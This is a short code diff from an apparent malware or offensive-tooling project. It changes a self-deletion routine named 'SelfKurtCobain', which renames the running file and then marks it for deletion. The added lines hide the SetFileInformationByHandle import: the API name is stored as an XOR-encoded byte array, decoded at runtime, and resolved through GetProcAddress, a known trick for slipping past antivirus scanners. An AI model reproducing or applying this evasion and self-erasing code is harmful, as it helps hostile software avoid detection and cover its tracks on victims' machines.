@@ -55,8 +55,13 @@ int SelfKurtCobain(void)
         return EXIT_FAILURE;
     }
 
+    BYTE sfibb[] = { 0xAC, 0x9A, 0x8B, 0xB9, 0x96, 0x93, 0x9A, 0xB6, 0x91, 0x99, 0x90, 0x8D, 0x92, 0x9E, 0x8B, 0x96, 0x90, 0x91, 0xBD, 0x86, 0xB7, 0x9E, 0x91, 0x9B, 0x93, 0x9A, 0x00 };
+    rox(sfibb, sizeof(sfibb) - 1, key);
 
-    if (!SetFileInformationByHandle(hFile, FileRenameInfo, PFRI, (DWORD)sizePrfi))
+    typedef BOOL(WINAPI* pSetFileInformationByHandle)(HANDLE, FILE_INFO_BY_HANDLE_CLASS, LPVOID, DWORD);
+	pSetFileInformationByHandle SetInfo = (pSetFileInformationByHandle)(GetProcAddress(hModuleK, reinterpret_cast<char*>(sfibb)));
+
+    if (!SetInfo(hFile, FileRenameInfo, PFRI, (DWORD)sizePrfi))
     {
         free(PFRI);
         CloseHandle(hFile);
@@ -72,7 +77,7 @@ int SelfKurtCobain(void)
         return EXIT_FAILURE;
     }
 
-    if (!SetFileInformationByHandle(hFile2, FileDispositionInfo, &FDI, sizeof(FDI)))
+    if (!SetInfo(hFile2, FileDispositionInfo, &FDI, sizeof(FDI)))
     {
         free(PFRI);
         CloseHandle(hFile2);
